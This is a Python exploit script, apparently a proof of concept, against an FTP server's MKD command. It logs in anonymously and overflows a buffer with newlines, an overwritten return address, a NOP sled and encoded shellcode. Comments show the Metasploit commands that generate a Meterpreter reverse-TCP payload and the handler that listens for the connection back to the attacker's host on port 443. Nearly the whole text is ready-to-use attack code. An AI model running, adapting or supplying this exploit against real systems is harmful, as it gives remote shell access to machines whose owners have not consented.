# payload generated with:
# msfpayload windows/meterpreter/reverse_ord_tcp # LHOST=192.168.34.10 LPORT=443 R | msfencode -b "\x00\x20\x0a\x0d" -s 250
# [*] x86/shikata_ga_nai succeeded with size 120 (iteration=1)
# 
# buf = 
# "\xdb\xcd\xba\x18\xe7\x75\xc6\xd9\x74\x24\xf4\x58\x33\xc9" +
# "\xb1\x18\x31\x50\x18\x03\x50\x18\x83\xc0\x1c\x05\x80\x3a" +
# "\x2d\x12\x0f\x48\x0e\x94\x5b\x0e\x9c\x5f\x0b\x93\x17\x4d" +
# "\x27\xd9\x07\xdf\x9a\x50\x44\x19\xd8\x5e\x79\x7a\x10\xea" +
# "\x92\x0f\x3e\x1c\xe7\x55\x83\x97\xbb\x50\x83\x2c\x0f\x56" +
# "\x6f\x32\x66\xe3\xce\x6c\x79\x1c\x5b\xfd\x45\xdd\xb2\xfd" +
# "\xdc\xd1\x19\x68\x1f\x80\x9f\x93\xcf\xc3\xc8\xab\x47\xc9" +
# "\x02\x44\x95\x0e\x12\x2f\x10\xef\x47\xf8\x2e\xa3\x36\x51" +
# "\x7f\x29\xa9\x0c\x28\xfb\x36\x4b"


# msfconsole: used multi/handler listening on 192.168.34.10:443 with a windows/meterpreter/reverse_ord_tcp payload

# run with this script:

#!/usr/bin/python

from socket import *

shellcode = ("\xdb\xcd\xba\x18\xe7\x75\xc6\xd9\x74\x24\xf4\x58\x33\xc9" 
"\xb1\x18\x31\x50\x18\x03\x50\x18\x83\xc0\x1c\x05\x80\x3a" 
"\x2d\x12\x0f\x48\x0e\x94\x5b\x0e\x9c\x5f\x0b\x93\x17\x4d" 
"\x27\xd9\x07\xdf\x9a\x50\x44\x19\xd8\x5e\x79\x7a\x10\xea" 
"\x92\x0f\x3e\x1c\xe7\x55\x83\x97\xbb\x50\x83\x2c\x0f\x56" 
"\x6f\x32\x66\xe3\xce\x6c\x79\x1c\x5b\xfd\x45\xdd\xb2\xfd" 
"\xdc\xd1\x19\x68\x1f\x80\x9f\x93\xcf\xc3\xc8\xab\x47\xc9" 
"\x02\x44\x95\x0e\x12\x2f\x10\xef\x47\xf8\x2e\xa3\x36\x51" 
"\x7f\x29\xa9\x0c\x28\xfb\x36\x4b")

def intel_order(i):
	a = chr(i % 256)
	i = i >> 8
	b = chr(i % 256)
	i = i >> 8
	c = chr(i % 256)
	i = i >> 8
	d = chr(i % 256)
	str = "%c%c%c%c" % (a, b, c, d)
	return str

host = "192.168.34.112"
port = 21
user = "ftp"
password = "ftp"
EIP = 0x77DA76AF

s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
print s.recv(1024)

s.send("user %s\r\n" % (user))
print s.recv(1024)

s.send("pass %s\r\n" % (password))
print s.recv(1024)

buffer = "MKD "
buffer += "\n" * 671
buffer += "A" * 3 + intel_order(EIP)
buffer += "\x90" * 40 + shellcode
buffer += "\r\n"

print "len: %d" % (len(buffer))

s.send(buffer)
print s.recv(1024)

s.close()

#EoF